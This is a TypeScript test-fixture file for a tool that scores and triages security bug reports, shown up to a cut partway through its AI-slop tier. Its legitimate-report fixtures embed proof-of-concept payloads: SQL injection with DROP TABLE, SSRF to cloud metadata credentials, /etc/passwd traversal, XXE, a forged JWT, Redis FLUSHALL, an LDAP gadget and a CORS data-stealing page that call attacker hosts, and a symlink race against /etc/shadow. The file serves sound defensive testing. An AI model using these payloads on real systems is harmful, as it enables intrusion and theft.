// v3.6.0 §7: Dev-only test endpoint that runs the engines against a labeled
// fixture battery (T1: legit, T2: borderline, T3: slop, T4: hallucinated)
// and reports composite + Engine 2 + triage distributions per cohort.
// Each fixture asserts an expected composite range, an expected Engine 2
// (substance) range, and an expected triage action set so a regression in
// any one dimension fails the suite. Mounted only when NODE_ENV !==
// "production". Public-only, no DB writes.
import { Router, type IRouter } from "express";
import { analyzeWithEnginesTraced } from "../lib/engines";
import { generateTriageRecommendation } from "../lib/triage-recommendation";
import { performActiveVerification } from "../lib/active-verification";
import { classifyReport } from "../lib/engines/avri";

const router: IRouter = Router();

type Tier = "T1_LEGIT" | "T2_BORDERLINE" | "T3_SLOP" | "T4_HALLUCINATED";
type TriageAction =
  | "AUTO_CLOSE"
  | "MANUAL_REVIEW"
  | "CHALLENGE_REPORTER"
  | "PRIORITIZE"
  | "STANDARD_TRIAGE";

interface Fixture {
  id: string;
  tier: Tier;
  text: string;
  claimedCwes?: string[];
  expectedComposite: [number, number];
  expectedEngine2: [number, number];
  expectedTriage: TriageAction[];
  // Optional reviewer-facing label grouping fixtures by the slop "shape"
  // they imitate (e.g. "fabricated_diff", "paraphrased_cve"). Surfaced in
  // /api/test/run so calibration can monitor each archetype's regression
  // headroom (current score vs. distance to LIKELY-INVALID ceiling).
  archetype?: string;
}

// =============================================================================
// T1 — Legitimate, well-evidenced reports (target composite >= 60, E2 >= 60)
// =============================================================================

const T1: Fixture[] = [
  {
    id: "T1-01-uaf-libfoo",
    tier: "T1_LEGIT",
    text: `# CVE-2024-1234 — Heap Use-After-Free in libfoo parser
**Affected:** libfoo 1.2.0–1.3.4 — github.com/example/libfoo
**Root cause:** parser/parse.c:412 frees \`buf\` on early-exit then re-uses it at line 418 inside \`foo_finalize()\`.

\`\`\`asan
==12345==ERROR: AddressSanitizer: heap-use-after-free on address 0x60200000a1c0 at pc 0x55e9b8c2f3d2
READ of size 8 at 0x60200000a1c0 thread T0
    #0 0x55e9b8c2f3d1 in foo_finalize parser/parse.c:418
    #1 0x55e9b8c2e210 in foo_main parser/main.c:88
freed by thread T0 here:
    #0 0x7f0001 in __interceptor_free
    #1 0x55e9b8c2f1aa in parser/parse.c:412
\`\`\`

\`\`\`diff
--- a/parser/parse.c
+++ b/parser/parse.c
@@ -410,7 +410,7 @@ int foo_parse(buf_t *buf) {
-    free(buf->payload);
+    /* defer free until finalize */
\`\`\`

POST /api/v1/parse HTTP/1.1
Host: example.test
Content-Type: application/octet-stream
Content-Length: 32

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`,
    claimedCwes: ["CWE-416"],
    expectedComposite: [60, 95],
    expectedEngine2: [60, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-02-sqli-django",
    tier: "T1_LEGIT",
    text: `# SQL Injection via raw queryset in admin export
**Affected:** github.com/myorg/myapp commit 7d3c9e1, file apps/admin/views.py:234
**CWE-89** — Improper Neutralization of Special Elements in SQL Command

The export view at apps/admin/views.py:234 builds a raw SQL string by
concatenating the request.GET["sort"] parameter without escaping:

\`\`\`python
# apps/admin/views.py
def export_csv(request):
    sort = request.GET.get("sort", "id")
    qs = User.objects.raw(f"SELECT * FROM users ORDER BY {sort}")  # line 234
    return render_csv(qs)
\`\`\`

PoC request:

\`\`\`http
GET /admin/export?sort=id;DROP%20TABLE%20sessions-- HTTP/1.1
Host: app.example.test
Cookie: sessionid=abc123
\`\`\`

Fix (verified locally against 4.2.7):

\`\`\`diff
-    qs = User.objects.raw(f"SELECT * FROM users ORDER BY {sort}")
+    if sort not in ALLOWED_SORTS: sort = "id"
+    qs = User.objects.raw("SELECT * FROM users ORDER BY %s" % sort)
\`\`\`

CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`,
    claimedCwes: ["CWE-89"],
    expectedComposite: [60, 95],
    expectedEngine2: [60, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-03-ssrf-aws",
    tier: "T1_LEGIT",
    text: `# SSRF in /api/fetch-thumbnail leaks AWS metadata
**Affected:** github.com/acme/imgservice main, src/handlers/thumbnail.go:88
**CWE-918** — Server-Side Request Forgery

The thumbnail handler fetches a user-supplied URL with no host allowlist
and no protocol restriction. AWS IMDSv1 is reachable from the container.

\`\`\`go
// src/handlers/thumbnail.go:82-94
func Thumbnail(w http.ResponseWriter, r *http.Request) {
    raw := r.URL.Query().Get("src")
    resp, err := http.Get(raw)               // line 88: no validation
    if err != nil { http.Error(w, err.Error(), 502); return }
    defer resp.Body.Close()
    io.Copy(w, resp.Body)
}
\`\`\`

PoC (returns 169.254.169.254 metadata as the image body):

\`\`\`http
GET /api/fetch-thumbnail?src=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role HTTP/1.1
Host: imgservice.example.test
\`\`\`

Captured response excerpt:
\`\`\`
{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
\`\`\`

Mitigation: enforce allowlist + IMDSv2 token requirement.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`,
    claimedCwes: ["CWE-918"],
    expectedComposite: [60, 95],
    expectedEngine2: [60, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-04-pathtraversal-flask",
    tier: "T1_LEGIT",
    text: `# Path Traversal in /downloads/<filename>
**Affected:** github.com/openexample/files-app v0.9.2, app/routes.py:117
**CWE-22**

The download route concatenates the user-supplied filename onto the uploads
directory without normalization. \`../\` sequences escape the sandbox.

\`\`\`python
# app/routes.py:115-121
@bp.route("/downloads/<path:filename>")
def download(filename):
    target = os.path.join(UPLOAD_DIR, filename)   # line 117
    return send_file(target)
\`\`\`

PoC:

\`\`\`http
GET /downloads/..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: files.example.test
\`\`\`

Server returns the contents of /etc/passwd. Verified against the public
demo instance at https://demo.example.test on 2024-09-12.

Fix:

\`\`\`diff
-    target = os.path.join(UPLOAD_DIR, filename)
+    target = safe_join(UPLOAD_DIR, filename)
+    if not target.startswith(UPLOAD_DIR + os.sep):
+        abort(404)
\`\`\``,
    claimedCwes: ["CWE-22"],
    expectedComposite: [60, 95],
    expectedEngine2: [60, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-05-xxe-libxml",
    tier: "T1_LEGIT",
    text: `# XXE in /api/import/xml — entity expansion enabled
**Affected:** github.com/widgetco/widget-importer 2.4.1, src/parsers/xml_loader.cpp:204
**CWE-611**

\`xml_loader.cpp:204\` constructs a libxml2 parser context with
\`XML_PARSE_NOENT\` set and no entity loader override, so DOCTYPE entity
references are resolved against the local filesystem.

\`\`\`cpp
// src/parsers/xml_loader.cpp:200-210
xmlDocPtr load_xml(const std::string& body) {
    int opts = XML_PARSE_NOENT | XML_PARSE_DTDLOAD;   // line 204
    return xmlReadMemory(body.data(), body.size(),
                         "import.xml", nullptr, opts);
}
\`\`\`

PoC payload posted to /api/import/xml:

\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY x SYSTEM "file:///etc/hostname"> ]>
<r>&x;</r>
\`\`\`

Response includes the contents of /etc/hostname inside the parsed result.

Fix: drop \`XML_PARSE_NOENT\`/\`XML_PARSE_DTDLOAD\`; install
\`xmlSetExternalEntityLoader\` returning NULL.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`,
    claimedCwes: ["CWE-611"],
    expectedComposite: [60, 95],
    expectedEngine2: [60, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-06-prototype-pollution",
    tier: "T1_LEGIT",
    text: `# Prototype pollution in deepMerge() of @example/utils 2.1.0
**Affected:** github.com/example-org/utils, src/deepMerge.ts:47-62 (commit 9a1b3f2)
**CWE-1321**

\`\`\`ts
// src/deepMerge.ts:47
export function deepMerge(target: any, source: any) {
  for (const key of Object.keys(source)) {        // line 49 — no __proto__ guard
    if (typeof source[key] === "object") deepMerge(target[key] ??= {}, source[key]);
    else target[key] = source[key];
  }
  return target;
}
\`\`\`

PoC:
\`\`\`js
const { deepMerge } = require("@example/utils");
deepMerge({}, JSON.parse('{"__proto__":{"polluted":true}}'));
console.log({}.polluted); // -> true
\`\`\`

Fix: skip key if \`key === "__proto__" || key === "constructor"\`.
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`,
    claimedCwes: ["CWE-1321"],
    expectedComposite: [50, 95],
    expectedEngine2: [45, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE", "MANUAL_REVIEW"],
  },
  {
    id: "T1-07-jwt-none",
    tier: "T1_LEGIT",
    text: `# Auth bypass: JWT \`alg: none\` accepted on /api/me
**Affected:** github.com/foosvc/api v0.14.2, src/middleware/auth.go:31
**CWE-347** — Improper Verification of Cryptographic Signature

\`\`\`go
// src/middleware/auth.go:28-37
tok, err := jwt.Parse(raw, func(t *jwt.Token) (interface{}, error) {
    return []byte(secret), nil   // line 31: returns key for *any* alg
})
\`\`\`

PoC (generates and uses a forged token):
\`\`\`bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"admin","exp":9999999999}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -H "Authorization: Bearer $HEADER.$PAYLOAD." https://api.example.test/api/me
# -> {"id":1,"role":"admin"}
\`\`\`

Fix: enforce \`if t.Method.Alg() != "HS256" { return nil, errBadAlg }\` in the keyfunc.`,
    claimedCwes: ["CWE-347"],
    expectedComposite: [50, 95],
    expectedEngine2: [45, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE", "MANUAL_REVIEW"],
  },
  {
    id: "T1-08-redis-cmdinj",
    tier: "T1_LEGIT",
    text: `# CRLF injection into Redis command builder
**Affected:** github.com/cacheco/cacheco 1.7.0, lib/redis_client.rb:88
**CWE-93**

The client builds RESP commands by string interpolation; a value containing
\`\\r\\n\` lets an attacker append a second Redis command.

\`\`\`ruby
# lib/redis_client.rb:85-92
def set(key, value)
  cmd = "*3\\r\\n$3\\r\\nSET\\r\\n$#{key.bytesize}\\r\\n#{key}\\r\\n$#{value.bytesize}\\r\\n#{value}\\r\\n"
  @sock.write(cmd)
end
\`\`\`

PoC:
\`\`\`ruby
client.set("foo", "bar\\r\\n*1\\r\\n$8\\r\\nFLUSHALL\\r\\n")
# -> Subsequent FLUSHALL drops every key in the database
\`\`\`

Fix: use the official \`redis\` gem or a length-prefixed serializer rather than string concatenation.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`,
    claimedCwes: ["CWE-93"],
    expectedComposite: [50, 95],
    expectedEngine2: [45, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE", "MANUAL_REVIEW", "CHALLENGE_REPORTER"],
  },
  {
    id: "T1-09-ssrf-graphql",
    tier: "T1_LEGIT",
    text: `# SSRF via GraphQL fetchUrl resolver
**Affected:** github.com/widgets-co/api commit a4b6c8d, schema/resolvers/fetch.js:55
**CWE-918**

\`\`\`js
// schema/resolvers/fetch.js:52-60
fetchUrl: async (_, { url }) => {
  const r = await fetch(url);                 // line 55: no validation
  return await r.text();
}
\`\`\`

GraphQL query that exfiltrates GCP metadata:
\`\`\`graphql
{ fetchUrl(url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token") }
\`\`\`

Response includes \`{"access_token":"ya29...","expires_in":3599}\`.

Fix: enforce a domain allowlist + reject RFC-1918 / link-local / loopback resolution.`,
    claimedCwes: ["CWE-918"],
    expectedComposite: [50, 95],
    expectedEngine2: [45, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE", "MANUAL_REVIEW"],
  },
  {
    id: "T1-10-rce-deserialize",
    tier: "T1_LEGIT",
    text: `# Insecure deserialization in /api/session/restore (Java/Jackson)
**Affected:** github.com/acme/portal 3.4.1, src/main/java/com/acme/SessionCtrl.java:118
**CWE-502**

The endpoint deserializes user-controlled JSON with default typing enabled,
allowing class instantiation gadgets (e.g. \`com.sun.rowset.JdbcRowSetImpl\`).

\`\`\`java
// SessionCtrl.java:115-122
ObjectMapper m = new ObjectMapper();
m.enableDefaultTyping();                                 // line 117
return m.readValue(req.getReader(), SessionState.class); // line 118
\`\`\`

PoC payload:
\`\`\`json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker.example.test/x","autoCommit":true}]
\`\`\`

Fix: remove \`enableDefaultTyping()\`; use \`@JsonTypeInfo\` with a strict allowlist.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`,
    claimedCwes: ["CWE-502"],
    expectedComposite: [55, 95],
    expectedEngine2: [55, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-11-toctou-symlink",
    tier: "T1_LEGIT",
    text: `# TOCTOU symlink race in log rotation script
**Affected:** github.com/observ-co/agent 1.5.3, scripts/rotate.sh:22-34
**CWE-367**

\`rotate.sh\` checks \`-f /var/log/agent.log\` then \`mv\` — between the check
and move an attacker who controls /var/log can replace the path with a
symlink to /etc/shadow, causing the next mv+chmod to clobber it.

\`\`\`bash
# scripts/rotate.sh:22-34
if [ -f "$LOGFILE" ]; then        # line 24 (TOCTOU)
  mv "$LOGFILE" "$LOGFILE.1"      # line 26
  chmod 600 "$LOGFILE.1"
fi
\`\`\`

PoC (run as the agent user):
\`\`\`bash
while true; do ln -sf /etc/shadow /var/log/agent.log; done &
systemctl start agent-rotate.service
\`\`\`

Fix: open the file with \`O_NOFOLLOW\`, then operate on the fd via \`/proc/self/fd/N\`.`,
    claimedCwes: ["CWE-367"],
    expectedComposite: [50, 95],
    expectedEngine2: [45, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE", "MANUAL_REVIEW", "CHALLENGE_REPORTER"],
  },
  // -------------------------------------------------------------------------
  // Sprint 11 (AVRI Part 13) named reference reports — legit cohort.
  // These three fixtures are the legit-side anchors for the T1−T3 composite
  // gap target. With AVRI enabled they should land in the family-specific
  // bands quoted in Part 13 of the spec.
  // -------------------------------------------------------------------------
  {
    id: "T1-AVRI-firefox-uaf",
    tier: "T1_LEGIT",
    text: `# Use-after-free in Firefox WebGPU command queue (Bug 1879312)
**Affected:** mozilla-central rev a8c1d4e, dom/webgpu/CommandEncoder.cpp:842
**CWE-416** — Use After Free

The WebGPU CommandEncoder finishes the queue then re-reads \`mEncoder->mState\`
inside \`CommandEncoder::Finalize()\` after the GPU device has freed the
backing object on the parent process side.

\`\`\`asan
==31415==ERROR: AddressSanitizer: heap-use-after-free on address 0x6190001a3c80 at pc 0x7f9b22c1f3d2 bp 0x7ffd5a3b22b0 sp 0x7ffd5a3b22a8
READ of size 8 at 0x6190001a3c80 thread T0
    #0 0x7f9b22c1f3d1 in mozilla::webgpu::CommandEncoder::Finalize() dom/webgpu/CommandEncoder.cpp:842:18
    #1 0x7f9b22c20b14 in mozilla::webgpu::CommandEncoder::Finish(...) dom/webgpu/CommandEncoder.cpp:901:10
    #2 0x7f9b22a47f02 in mozilla::dom::Promise::MaybeResolve(...) dom/promise/Promise.cpp:622:5
    #3 0x7f9b22cabd55 in mozilla::TaskController::DoExecute(...) xpcom/threads/TaskController.cpp:746:7
freed by thread T0 here:
    #0 0x55a1f93b7340 in __interceptor_free (xul.so+0x4b340)
    #1 0x7f9b22c1ef0a in mozilla::webgpu::WebGPUParent::DeallocCommandEncoder dom/webgpu/ipc/WebGPUParent.cpp:1188
\`\`\`

\`\`\`diff
--- a/dom/webgpu/CommandEncoder.cpp
+++ b/dom/webgpu/CommandEncoder.cpp
@@ -838,7 +838,9 @@ void CommandEncoder::Finalize() {
-  auto* state = mEncoder->mState;          // line 842 (UAF)
+  if (!mEncoder || !mEncoder->IsValid()) return;
+  RefPtr<EncoderState> state = mEncoder->mState;
\`\`\`

Reproducer (run under ASAN build):
\`\`\`bash
./mach run --enable-webgpu --setpref dom.webgpu.enabled=true \\
  --no-remote --new-instance test/wpt/webgpu/queue-finish-after-destroy.html
\`\`\`
Environment: Linux x86_64, clang-17, build with --enable-address-sanitizer.

CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H`,
    claimedCwes: ["CWE-416"],
    expectedComposite: [55, 95],
    expectedEngine2: [55, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-AVRI-cve-2025-0725-curl",
    tier: "T1_LEGIT",
    text: `# CVE-2025-0725 — Integer overflow in libcurl gzip content-decoding
**Affected:** curl/curl 7.x through 8.11.x when built against zlib < 1.2.0.3
**CWE-190** — Integer Overflow or Wraparound

\`lib/content_encoding.c::inflate_stream()\` computes the decompressed write
size as \`DSIZ - z->avail_out\`, which wraps when the legacy zlib reports
an avail_out larger than DSIZ on a crafted gzip stream. The wrapped size
is then passed straight to \`Curl_client_write()\`.

\`\`\`c
// lib/content_encoding.c around line 290 in 8.11.0
status = inflate(z, Z_BLOCK);
nread = DSIZ - z->avail_out;                       /* wraps to ~4 GiB */
result = Curl_client_write(data, CLIENTWRITE_BODY, decomp, nread);  /* line 297 */
\`\`\`

ASAN trace from \`./src/curl --compressed http://attacker/blob.gz\`:

\`\`\`
==54321==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000009f80
WRITE of size 4294934527 at 0x611000009f80 thread T0
    #0 0x4abf1a in __asan_memcpy (curl+0x4abf1a)
    #1 0x55c1aa in inflate_stream lib/content_encoding.c:297
    #2 0x55b0ee in Curl_unencode_gzip_write lib/content_encoding.c:412
    #3 0x4f2210 in Curl_client_write lib/sendf.c:712
\`\`\`

\`\`\`diff
--- a/lib/content_encoding.c
+++ b/lib/content_encoding.c
@@ -293,6 +293,8 @@ static CURLcode inflate_stream(...)
   nread = DSIZ - z->avail_out;
+  if(z->avail_out > DSIZ)
+    return CURLE_BAD_CONTENT_ENCODING;
   result = Curl_client_write(data, CLIENTWRITE_BODY, decomp, nread);
\`\`\`

Verified file paths exist at github.com/curl/curl @ commit 3fa2ae2 (curl-8_11_0).
Build env: gcc 12.3, zlib 1.2.0.2 from \`/opt/legacy-zlib\`, \`./configure --with-zlib=/opt/legacy-zlib\`.

CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`,
    claimedCwes: ["CWE-190"],
    expectedComposite: [55, 95],
    expectedEngine2: [55, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE"],
  },
  {
    id: "T1-AVRI-curl-hsts-bypass",
    tier: "T1_LEGIT",
    text: `# curl HSTS bypass via trailing-dot host: HTTPS downgrade for cached HSTS hosts
**Affected:** curl/libcurl 8.0.0–8.10.1, file \`lib/hsts.c\`, function \`Curl_hsts()\`
**CWE-319** — Cleartext Transmission of Sensitive Information

When the HSTS cache lookup is performed, the host is normalized but the
single-trailing-dot form ("example.com.") is *not* stripped before the
case-insensitive cache compare on line 218. As a result, navigating to
\`http://example.com./path\` skips the HSTS upgrade for an entry that was
recorded as \`example.com\`, and the request is sent in cleartext over
port 80 even though HSTS \`max-age\` is still in force.

\`\`\`c
// lib/hsts.c:212-228 in 8.10.1
static struct stsentry *hsts_entry(struct hsts *h, const char *hostname)
{
  struct Curl_llist_element *e;
  size_t hlen = strlen(hostname);
  for(e = h->list.head; e; e = e->next) {
    struct stsentry *sts = e->ptr;
    /* line 218: strcasecompare requires identical lengths,
       so "example.com." (13) never matches "example.com" (11). */
    if(strcasecompare(sts->host, hostname))
      return sts;
  }
  return NULL;
}
\`\`\`

PoC against a host that previously sent HSTS:

\`\`\`
$ curl --hsts ./jar --silent -o /dev/null -w '%{url_effective}\\n' \\
       http://example.com./
http://example.com./           # <-- expected https://example.com./
\`\`\`

Wireshark on lo confirms the request leaves on TCP/80 in cleartext after
the HSTS jar has a fresh entry for example.com (max-age=31536000).

\`\`\`diff
--- a/lib/hsts.c
+++ b/lib/hsts.c
@@ -210,6 +210,11 @@ static struct stsentry *hsts_entry(struct hsts *h, const char *hostname)
+  /* normalize a single trailing dot — RFC 6797 §8.2 says HSTS hosts
+     are canonicalized without the trailing label separator. */
+  size_t hlen = strlen(hostname);
+  if(hlen > 1 && hostname[hlen - 1] == '.')
+    hlen--;
   for(e = h->list.head; e; e = e->next) {
     struct stsentry *sts = e->ptr;
-    if(strcasecompare(sts->host, hostname))
+    if(strncasecompare(sts->host, hostname, hlen) && !sts->host[hlen])
       return sts;
\`\`\`

Repos verified: \`lib/hsts.c\` exists at github.com/curl/curl tag curl-8_10_1.
CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N`,
    claimedCwes: ["CWE-319"],
    expectedComposite: [50, 95],
    expectedEngine2: [45, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE", "MANUAL_REVIEW"],
  },
  {
    id: "T1-12-cors-credentials",
    tier: "T1_LEGIT",
    text: `# CORS misconfiguration leaks user data via reflected origin
**Affected:** github.com/dashco/dashboard 0.22.4, server/cors.ts:12-19
**CWE-942**

\`\`\`ts
// server/cors.ts:12-19
app.use((req, res, next) => {
  const o = req.headers.origin;
  if (o) res.setHeader("Access-Control-Allow-Origin", o);   // line 15: reflects any origin
  res.setHeader("Access-Control-Allow-Credentials", "true");
  next();
});
\`\`\`

PoC HTML hosted at attacker.example.test:
\`\`\`html
<script>
  fetch("https://dash.example.test/api/me", {credentials: "include"})
    .then(r => r.text()).then(t => navigator.sendBeacon("/steal", t));
</script>
\`\`\`

Fix: replace reflection with an explicit allowlist of trusted origins.`,
    claimedCwes: ["CWE-942"],
    expectedComposite: [50, 95],
    expectedEngine2: [45, 100],
    expectedTriage: ["PRIORITIZE", "STANDARD_TRIAGE", "MANUAL_REVIEW"],
  },
];

// =============================================================================
// T2 — Borderline reports: real intent, weak evidence (composite 35–65)
// =============================================================================

const T2: Fixture[] = [
  {
    id: "T2-01-xss-unconfirmed",
    tier: "T2_BORDERLINE",
    text: `# Possible XSS in /admin/dashboard

The /admin/dashboard endpoint may reflect user input. I noticed when I
submit \`<script>alert(1)</script>\` in the search box, the value appears
in the page source. I haven't confirmed it executes in the browser yet.

Steps:
1. Go to /admin/dashboard
2. Enter the payload in search
3. Observe the response

Environment: Chrome 120, target running their public demo.

References:
- OWASP XSS cheat sheet`,
    expectedComposite: [30, 65],
    expectedEngine2: [25, 65],
    expectedTriage: ["MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-02-csrf-noproof",
    tier: "T2_BORDERLINE",
    text: `# Suspected CSRF on /account/email-change

The /account/email-change endpoint accepts POST without checking a token,
based on the response headers I saw in DevTools. I tried sending the same
request from a different origin but the cookies didn't transmit so I
can't confirm exploitability end-to-end.

What I observed:
- Request: POST /account/email-change with form field new_email
- Response: 200 OK, no CSRF token validated server-side that I can see
- SameSite attribute on the session cookie is unset

Suggested fix: add a CSRF token bound to the session and verify on POST.

I don't have a working PoC HTML page to demonstrate the cross-origin
trigger. Happy to try harder if you confirm SameSite is genuinely missing.`,
    expectedComposite: [10, 35],
    expectedEngine2: [5, 30],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW"],
  },
  {
    id: "T2-03-info-disclosure-headers",
    tier: "T2_BORDERLINE",
    text: `# Server version exposed in response headers

The application returns Server: nginx/1.18.0 and X-Powered-By: Express
on every response. While this isn't directly exploitable, it makes
fingerprinting trivial and could help an attacker target known CVEs in
those specific versions.

Reproduction:

\`\`\`http
HEAD / HTTP/1.1
Host: app.example.test

HTTP/1.1 200 OK
Server: nginx/1.18.0
X-Powered-By: Express
\`\`\`

Recommendation: strip both headers via reverse proxy / express config.

I'm aware this is low severity — submitting as informational.`,
    expectedComposite: [30, 60],
    expectedEngine2: [25, 60],
    expectedTriage: ["MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-04-rate-limit-missing",
    tier: "T2_BORDERLINE",
    text: `# /api/login appears to lack rate limiting

I tried sending 100 POST requests to /api/login with random passwords and
all 100 returned 401 within about 4 seconds. There was no slowdown, no
captcha, and no account lockout that I could detect.

Tooling: a small bash loop with curl. I didn't try a real password
spraying attack — I stopped after observing the lack of throttling
because I didn't want to lock anyone out.

This is consistent with no rate limiting on the auth endpoint, which
would let an attacker enumerate weak passwords given a list of usernames.

Suggested fix: per-IP and per-account exponential backoff after 5
failures within 5 minutes.`,
    expectedComposite: [10, 50],
    expectedEngine2: [5, 50],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-05-clickjack-noframeguard",
    tier: "T2_BORDERLINE",
    text: `# Clickjacking: /account/delete loads in iframe

curl -I https://app.example.test/account/delete returns no
X-Frame-Options or Content-Security-Policy frame-ancestors header. I
hosted a quick test page on a private domain and confirmed the page
loads inside an <iframe>.

I did not produce a working overlay PoC that tricks the user into
clicking "Delete account" — that would require knowing the exact pixel
positions and coordinating with a logged-in victim, which I haven't
done.

Recommend: \`Content-Security-Policy: frame-ancestors 'none'\`.`,
    expectedComposite: [10, 50],
    expectedEngine2: [5, 50],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-06-mixed-content",
    tier: "T2_BORDERLINE",
    text: `# Mixed-content warning on /pricing

When loading https://www.example.test/pricing the browser console reports
that an analytics script is loaded over plain http://. Because the site
serves an HSTS header most browsers will block this and break analytics
rather than degrade security, but the warning suggests the page template
hardcodes an http:// URL somewhere.

I haven't found the exact line in the template. Browser console message:

\`\`\`
Mixed Content: The page at 'https://www.example.test/pricing' was loaded
over HTTPS, but requested an insecure script 'http://cdn.example.test/an.js'.
\`\`\`

Recommend a search for hardcoded http:// in templates and asset
configs.`,
    expectedComposite: [10, 50],
    expectedEngine2: [5, 50],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-07-idor-suspicion",
    tier: "T2_BORDERLINE",
    text: `# Possible IDOR on /api/orders/:id

I noticed that GET /api/orders/12345 returns the order even when my
session belongs to a different account. I only tested with my own two
test accounts (id 12345 belonging to test-A and id 12346 belonging to
test-B). Logged in as test-A, I requested /api/orders/12346 and got
back the full order body.

I haven't checked whether the IDs are easily enumerable across real
customers, or whether other entity types behave the same way. Could be
an authorization bug or could be intentional (e.g. shared org).

Steps to reproduce included; happy to expand if you confirm intent.`,
    expectedComposite: [15, 55],
    expectedEngine2: [10, 55],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-08-weak-jwt-secret",
    tier: "T2_BORDERLINE",
    text: `# JWT signed with a short HMAC secret (suspected)

The JWTs your app issues decode to HS256 with a sub/exp/iss claim set.
I ran hashcat against a single token using the rockyou wordlist for
~10 minutes and didn't get a hit, so I have no proof the secret is
weak — only that the algorithm choice + lack of kid rotation invites
offline brute force if a token ever leaks.

Suggested hardening: rotate to RS256 (or at minimum HS384 with a
randomly generated 32-byte secret), add a kid header for rotation,
and shorten exp.

I can run a longer wordlist if you'd like — but submitting now in case
the algorithm/kid recommendation is independently useful.`,
    expectedComposite: [10, 55],
    expectedEngine2: [5, 55],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-09-stack-trace-on-error",
    tier: "T2_BORDERLINE",
    text: `# Stack trace exposed when /api/search receives malformed JSON

POST /api/search with body \`{\` (literal opening brace) returns a 500 with
a full Node.js stack trace in the response body, including absolute file
paths under /home/deploy/api/src and the version of the JSON parser.

This isn't directly exploitable but it discloses the deploy path and
internal module structure. Likely a missing error handler in
src/middleware/parse-json.js (path inferred from the leaked trace).

Recommend: catch SyntaxError in the JSON body parser and respond with
a generic 400, plus drop NODE_ENV=production-style stack-trace
suppression in the global error handler.`,
    expectedComposite: [10, 55],
    expectedEngine2: [5, 55],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
  {
    id: "T2-10-open-redirect",
    tier: "T2_BORDERLINE",
    text: `# Possible open redirect on /auth/callback?next=

After logging in, the app redirects to whatever URL is in the \`next\`
query parameter. I tested:

- /auth/callback?next=/dashboard -> redirects to /dashboard (expected)
- /auth/callback?next=https://example.attacker.test/ -> redirects to the external host

This would let a phishing email link to a real login URL on your domain
that ends up landing the victim on an attacker-controlled page after
auth, which is great for credential-prompt phishing.

Suggested fix: validate \`next\` is a same-origin path beginning with
"/" and not "//", or maintain an explicit allowlist.`,
    expectedComposite: [15, 55],
    expectedEngine2: [10, 55],
    expectedTriage: ["AUTO_CLOSE", "MANUAL_REVIEW", "STANDARD_TRIAGE"],
  },
];

// =============================================================================
// T3 — AI-generated slop: vague, no evidence, no specifics
// =============================================================================

const T3: Fixture[] = [
  {
    id: "T3-01-generic-letter",
    tier: "T3_SLOP",
    text: `# Critical Security Vulnerability in Your Application

Dear Security Team,

I am writing to report a critical security issue I have identified in your
application. As an experienced security researcher, I believe this issue
poses a significant risk and should be addressed immediately.

The application appears to be vulnerable to multiple types of attacks
including but not limited to SQL injection, XSS, CSRF, and remote code
execution. These vulnerabilities could allow an attacker to compromise
the entire system.

I recommend you implement industry best practices and follow the OWASP
Top 10 to mitigate these risks. Please consider sanitizing all user input
and using parameterized queries where appropriate.

I look forward to your prompt response and a fair bug bounty.`,
    expectedComposite: [0, 35],
